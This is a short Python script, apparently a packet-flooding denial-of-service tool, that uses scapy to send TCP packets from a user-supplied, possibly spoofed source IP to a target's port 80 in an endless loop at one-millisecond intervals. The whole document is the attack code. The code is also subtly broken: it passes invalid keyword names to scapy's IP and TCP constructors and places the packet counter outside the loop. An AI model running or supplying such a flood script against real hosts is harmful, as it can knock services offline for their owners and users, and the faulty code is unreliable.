from scapy.all import *  
IP_source = input("Enter the IP address of the Source: ")  
IP_target = input("Enter the IP address of the Target: ")  
port_source = int(input("Enter the Source Port Number:"))  
n = 1  
  
while True:  
    IP1 = IP(IP_source = IP_source, destination = IP_target)  
    TCP1 = TCP(srcport = port_source, dstport = 80)  
    pkt = IP1 / TCP1  
    send(pkt, inter = .001)  
     
    print ("The sent packet is:", n)  
n = n + 1  